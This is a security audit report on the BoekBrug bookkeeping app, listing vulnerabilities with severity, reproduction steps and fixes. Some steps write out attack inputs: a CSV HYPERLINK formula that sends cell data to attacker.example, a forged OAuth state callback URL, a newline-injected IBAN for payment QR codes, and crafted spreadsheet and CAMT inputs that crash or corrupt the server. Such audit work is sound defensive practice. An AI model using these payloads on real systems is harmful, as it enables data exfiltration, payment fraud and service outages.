# BoekBrug — Security & Correctness Hunt Report

Scope of this report: the multi-round adversarial hunt over the in-app file
system and its surrounding trust/lifecycle/ingestion surfaces. Each finding lists
**severity · lane · location · reproduction · impact · fix · status**.

- **Lane** — `MY-LANE` = the personal file manager (documents/folders/sharing/
  smart-views/search) and code that writes into it; `ADJACENT` = email/OAuth/
  invoicing/bank/deps that border it; `ACCOUNTANT-LANE` = closing-package /
  quarter package (owned separately on `main` — reported only, never edited here).
- **Status** — `FIXED (commit)` = already merged on `claude/in-app-file-system-ga6nu0`;
  `OPEN` = reported, awaiting a go / owner action.

Verification note: findings were produced by independent review agents and then
spot-verified against the real code. Line numbers are indicative.

---

## 0. Already fixed this session (for context)

| Area | What | Commit |
|---|---|---|
| Sharing/period | `[FIN-QUARTER]` share preserves the file's quarter; bankafschrift not re-stamped; explicit un-share wins | earlier |
| Sharing cleanup | `[FIN-UNIFY]` retired dead path-based sharing (single `shared`-flag definition) | earlier |
| Folder placement | `[I#1]` upload persists `folder_id` (was silently root) | e3dd7bd |
| Folder integrity | `[Fo#1]` no folder cycles · `[Fo#2]` reserved system-folder names · `[Fo#3]` deleteFolder error checks · `[Fo#5]` moveFolder system guard · `[Fo#6]` folders-tree fields | e3dd7bd / 21499da |
| Trashed leaks | `[T#3]` global search · `[T#4]` bank statements list | e3dd7bd / 21499da |
| Delete safety | `[I#2]` deleteDocument row-first + checked · `onboarding/reset` same order | e3dd7bd / a3c8321 |
| Trash honesty | Removed fake permanent-delete / "30-day" promise (7-yr retention) | bc43aa0 |
| Classify | `[I#4]` bank-detection word-bounded, no invoice override | 21499da |
| Frontend robustness | `[F#1–F#8]` signed-URL cache/dedupe/cap, cancel guards, input reset, etc. | 21499da |
| **Accountant linking** | **`[SEC-LINK]` dropped the unconsented-self-link INSERT policy; unlink multi-row; subject-status trashed** | 4216a43 |
| **Accountant read RLS** | **`[SEC-DOCS-RLS]` versioned `documents_accountant_read` (was prod-only)** | 139a7be |

---

## 1. CRITICAL

### C1 — `xlsx@0.18.5` has known CVEs, reachable server-side on untrusted uploads
- **Lane:** ADJACENT (parser shared by bank/turnover/intake) · **Status:** OPEN
- **Location:** `package.json` (`"xlsx": "^0.18.5"`); `src/lib/xlsx-adapter.ts:13` (`XLSX.read`); reached from `src/app/api/turnover/import/route.ts` (10MB), `src/app/api/bank/upload` + `src/app/api/intake` bank branch via `src/lib/bank-ingest.ts:60` (`detectSheetKind(sheetBytesToMatrix(...))` for any ZIP/OLE2-magic upload).
- **Repro:** upload a crafted `.xlsx`: (a) a `__proto__`-poisoning cell/defined-name → **CVE-2023-30533** prototype pollution corrupts `Object.prototype` for the whole Node process; (b) a ReDoS-triggering cell → **CVE-2024-22363** CPU exhaustion. The endpoint `try/catch` does not stop pollution side-effects or CPU burn.
- **Impact:** server-wide logic corruption / DoS from a single authenticated upload.
- **Fix:** upgrade to SheetJS **≥ 0.20.2**. The npm registry is frozen at 0.18.5 (SheetJS moved to their own CDN), so this is a dependency-source change: point `xlsx` at the SheetJS CDN tarball (`https://cdn.sheetjs.com/xlsx-0.20.x/xlsx-0.20.x.tgz`) in `package.json` and reinstall. Needs a build test; affects bank/turnover parsing.

---

## 2. HIGH

### H1 — CSV formula injection in the invoice CSV builders  ✅ verified
- **Lane:** ADJACENT (invoice export + GDPR export) · **Status:** OPEN
- **Location:** `src/lib/export.ts:181` (`invoicesToCsv`) and `:242` (`invoicesToCsvAccountant`) — the `escape()` only RFC-4180-quotes `;`/`\n`/`"`, it does **not** neutralise formula leads `= + - @`. Consumers: `src/app/api/export/route.ts:164` (accountant "all clients"), `:225` (single user), `src/lib/account-export.ts:88` (GDPR `facturen.csv`).
- **Repro:** create an invoice with `client_name = =HYPERLINK("https://attacker.example/"&A1,"OK")`; accountant runs `GET /api/export?accountant=true&year=2026`; opening the CSV in Excel executes the formula.
- **Impact:** formula/command execution in a third party's (accountant's) spreadsheet; data exfiltration via HYPERLINK.
- **Fix:** route every cell through a `csvCell`-style neutraliser — the model already exists at `src/app/api/kluis/export/route.ts:27` (`if (/^[=+\-@\t\r]/.test(s)) s = "'" + s`). `bank-csv.ts:389` also already does this — export.ts is the gap.

### H2 — SheetJS matrix densification → OOM from a tiny file
- **Lane:** ADJACENT (parser) · **Status:** OPEN
- **Location:** `src/lib/xlsx-adapter.ts:17` `sheet_to_json(sheet, { header:1, defval:null, blankrows:false })`.
- **Repro:** a ~10KB `.xlsx` declaring `<dimension ref="A1:XFD1048576"/>` (16384×1048576) with two real cells → `sheet_to_json` iterates the whole declared range, allocating per cell → multi-GB transient allocation → **server OOM** (not caught by `try/catch`; kills the process, crashing the shared upload path).
- **Fix:** bound the `!ref` rows×cols (and/or a decompressed-size guard) before `sheet_to_json`; reject oversized ranges with a clear error.

### H3 — CAMT.053 amount has no finite/NaN guard → financial corruption
- **Lane:** ACCOUNTANT/BANK · **Status:** OPEN (report-only)
- **Location:** `src/lib/bank-parser.ts:528` `parseFloat(amtMatch[2])`; flows to `bank-import.ts:172` → `bank-ingest.ts:97` insert with no `Number.isFinite` check.
- **Repro:** a CAMT file with `<Amt Ccy="EUR">1e309</Amt>` (→ Infinity) or `<Amt Ccy="EUR">abc</Amt>` (→ NaN) writes non-finite into `bank_transactions.amount`, poisoning every downstream sum (reconciliation, quarter totals).
- **Fix:** `if (!Number.isFinite(rawAmount)) { errors.push(...); return null; }` (MT940/CSV/EFT already guard).

---

## 3. MEDIUM-HIGH

### MH1 — OAuth `state` is forgeable → mailbox-connection CSRF
- **Lane:** ADJACENT (email OAuth; the writes it enables land in MY-LANE) · **Status:** OPEN
- **Location:** `src/app/api/email/connect/route.ts:30` builds `state = base64({userId, provider})` (no random nonce); `src/app/api/email/callback/gmail/route.ts:49` (and outlook `:42`) does `const userId = user?.id ?? stateData.userId` — trusts the forgeable state when no session.
- **Repro:** attacker obtains a valid OAuth `code` for the attacker's own mailbox, then triggers `/api/email/callback/gmail?code=<attacker_code>&state=base64({"userId":"<victim>","provider":"gmail"})` with no BoekBrug session → the attacker's mailbox tokens are linked into the victim's `email_connections`; the victim's next sync ingests the attacker's emails, creating documents/invoices in the victim's account.
- **Impact:** inject arbitrary content into a victim's file manager / verify queue (needs the victim's UUID, which leaks).
- **Fix:** random state nonce stored in an HttpOnly cookie (or server-side), verified on callback; never fall back to `stateData.userId`.

---

## 4. MEDIUM

### M1 — Email attachment pipeline enforces no size/type ceiling
- **Lane:** MY-LANE (writes documents) · **Status:** OPEN
- **Location:** `src/lib/email-integration.ts:1746`,`:2002` upload raw `fileBuffer`; `classifyAttachment` (`:1615`) sends it to Claude — no byte cap (manual upload caps 10MB at `email/upload/route.ts:47`).
- **Repro:** anyone emails the owner large PDFs → stored in the owner's bucket + a Claude call each → unbounded storage growth + AI spend from untrusted inbound mail.
- **Fix:** enforce the same per-file byte cap (+ a per-sync aggregate cap) before Storage upload / AI classification.

### M2 — Email HTML injection in Resend templates
- **Lane:** ADJACENT (email) · **Status:** OPEN
- **Location:** `src/lib/email.ts` — user free-text interpolated raw into `html`: `sendMessageNotification` (`:198`, message body → recipient), `sendInvoiceToClient` (`:139`, clientName/invoiceNumber → customer), invite/unlink templates (names). `sendDraftQueueEmail` (`:285`) already escapes correctly — use it as the model.
- **Impact:** phishing links / spoofed content / hidden text in mail to a third party (scripts are stripped by clients, so no XSS).
- **Fix:** apply the existing `escape()` helper to every interpolated user string.

### M3 — EPC/SEPA QR `name` field not newline-stripped → QR IBAN injection
- **Lane:** ADJACENT (payments) · **Status:** OPEN
- **Location:** `src/lib/epc-qr.ts:91` `name = (input.name ?? '').trim().slice(0,70)` — not stripped of CR/LF, while `reference` two lines down **is** (`:103`). Exploit path: `src/app/dashboard/incoming/manage/IncomingManageClient.tsx:907` passes `name = inv.client_name` (supplier name, OCR/attacker-controlled) into the EPC payload.
- **Repro:** vendor name `"Legit BV\nNL91ABNA0417164300"` injects an attacker IBAN into the line-7 (IBAN) position of the QR the owner scans, while the on-screen IBAN still shows the real one.
- **Fix:** strip CR/LF from `name` exactly as `reference` already does.

### M4 — CAMT.053 malformed `<ValDt>` drops the whole batch (false-green)
- **Lane:** BANK · **Status:** OPEN (report-only)
- **Location:** `src/lib/bank-parser.ts:539` takes the date verbatim; a single `<Dt>9999-99-99</Dt>` fails the batch insert (`bank-ingest.ts:97`), which only sets `inserted` on `!error` and swallows the failure → all transactions silently dropped, file still stored ("verwerkt", 0 inserted).
- **Fix:** validate the CAMT date shape; drop the single bad entry, not the batch; surface a warning.

### M5 — CAMT ReDoS / O(n²) tag scanning
- **Lane:** BANK · **Status:** OPEN (report-only)
- **Location:** `bank-parser.ts:497` `/<Ntry>([\s\S]*?)<\/Ntry>/g`, `:547` `/<TxDtls>([\s\S]*?)<\/TxDtls>/`. Hundreds of thousands of unclosed `<Ntry>` within the 5–10MB cap → seconds-to-minutes of single-threaded CPU per request.
- **Fix:** bound entry count / use a streaming XML parser.

---

## 5. LOW

- **L1 — turnover `num()` silent NaN→0 + sign loss** — `src/lib/turnover-import.ts:34,:154`: an unparseable `Omzet incl.` cell becomes `0` and the day is `continue`d with no per-row warning; a parenthesised negative `(1.234,56)` loses its sign. Financial under-statement, mitigated by the human preview. *(BANK lane, report-only.)*
- **L2 — intake `ilike` wildcard from parsed vendor** — `src/app/api/intake/route.ts:194` `query.ilike("client_name", q.vendor)`: `%`/`_` in an AI/parsed vendor name broaden the dedup match (no SQL injection — parameterised; own rows only). Fix: escape `%`/`_`/`\` (same as the search fix `[M3]`). *(MY-LANE-adjacent.)*
- **L3 — UBL unescaped XML (dead code)** — `src/lib/export.ts:394` interpolates `invoice_number`/date without `escapeXml`; `invoicesToUbl` is **not wired to any route** (the live route uses `ubl-export.ts` via `xmlbuilder2`, which escapes correctly). Flag before anyone wires it up.
- **L4 — signed-URL 1h window after unlink** — `src/app/dashboard/brug/page.tsx:112` signs at 3600s; RLS revocation is immediate, but an already-issued URL stays valid up to 1h. Consider a shorter TTL for the accountant view.
- **L5 — rate-limit fails open** — `src/lib/rate-limit.ts:81` returns `{ allowed: true }` on RPC error (cost/DoS exposure on AI/OCR/email-sync, not access control). Deliberate; flagging.
- **L6 — OAuth error bodies logged** — `email-integration.ts:376`,`callback/outlook/route.ts:63` log provider *error* bodies (not tokens); tighten before prod.

---

## 6. Open lifecycle / audit items (prior security round)

- **A1 — Account "deletion" never reclaims storage/rows; retention timer has no consumer.** `api/account/delete` bans the user + sets `data_eligible_for_deletion_at = now+7y`, but `isEligibleForDeletion` (`src/lib/retention.ts:50`) has **no caller** and there is **no purge cron** — a deleted account's `documents` rows and every Storage object persist forever; GDPR erasure never executes. *Product/compliance decision (like the trash purge): build a retention-purge cron that consumes the timer, or state the policy explicitly.*
- **A2 — FK cascade orphans Storage on a hard delete.** `documents.user_id`/`folders.user_id` are `ON DELETE CASCADE` to `profiles`→`auth.users`, but Storage objects have no DB trigger — an admin `auth.admin.deleteUser` / dashboard hard-delete cascades the rows and orphans every object. *Recommend a storage-cleanup step or a periodic orphan sweep.*
- **A3 — `documents.shared` column + Storage bucket policies still prod-only.** `[SEC-DOCS-RLS]` versioned the `documents_accountant_read` policy; the `documents.shared` column and SECTION 8's Storage policies (shown only as comments in `database.sql`) are still not in migrations — a fresh rebuild would not set up the full gate. *Capture both into migrations; verify the live policy `USING` matches.*
- **A4 — content_hash dedup TOCTOU** (`[I#3]`/email `#3`) — concurrent uploads/syncs of identical bytes can create duplicate rows (no unique index). A unique index is **the wrong fix** (it would break the intentional `allowDuplicate` "upload again" feature); mitigate with a per-user sync lock if it becomes a problem.

---

## 7. Verified SOUND (no action — reassurance)

- **File-manager API:** no IDOR — every read/write is double-scoped (owner RLS + explicit `.eq("user_id", …)`); folder move validates ownership + blocks cycles.
- **Dual-path accountant authz** (closing-package, result, email/file, subject-status): each re-verifies the `accountant_clients` link **before** any service_role work.
- **Invitation tokens:** `gen_random_uuid`, UNIQUE, single-use, 14-day expiry, `auth.email()` match on accept (hijack closed).
- **Unlink revocation is live** via `is_my_accountant_client()` (no cached grant); storage keys are always owner-prefixed + sanitised (no traversal).
- **Cron auth** fails closed (`CRON_SECRET` bearer); **Vault** token RPCs are `SECURITY DEFINER`, revoked from public/authenticated, never returned to clients.
- **No SSRF** — every pipeline `fetch` targets a hardcoded host; email links/images never dereferenced.
- **Auto-invoice from email** inserts `status='processing'`; `invoices.shared` is a GENERATED column (`status IN sent/received/paid`) → email imports are never accountant-visible without human confirm; email documents never set `shared`.
- **Public pay page/token** (`/pay/[token]`): UUID-gated, rate-limited, projected through a tight allowlist (`toPublicPayView`) — no cross-invoice/PII leak; renders as React text.
- **CSV formula injection neutralised** in `kluis/export` (`csvCell`) and `bank-csv` (`toNormalizedCsv`); **invoice PDF** (`@react-pdf`) escapes; **UBL live route** escapes via `xmlbuilder2`; **unpdf** path is fail-safe.
- **Prototype pollution in app code** guarded (MT940 keys `[A-Z]{2,4}`; fixed literal keys elsewhere) — the residual risk is inside SheetJS itself (**C1**).
- **Export/delete/reset** are strictly session-scoped — no cross-user leak or IDOR.

---

## 8. Recommended fix order

1. **C1** (xlsx upgrade) + **H2** (bound the sheet range) — a tiny authenticated upload crashes/corrupts the shared server today.
2. **H1** (CSV `csvCell` in export.ts/account-export) — third-party Excel execution; trivial, reuses an existing helper.
3. **MH1** (OAuth state nonce) — mailbox-connection CSRF.
4. **H3/M4** (CAMT `isFinite` + date-shape guards) — one-line financial-integrity fixes.
5. **M1/M2/M3** (email size cap, email-HTML escape, QR CR/LF strip) — bounded but reach third parties.
6. **A1/A3** — compliance + audit (deletion purge, version the remaining prod-only DB objects).
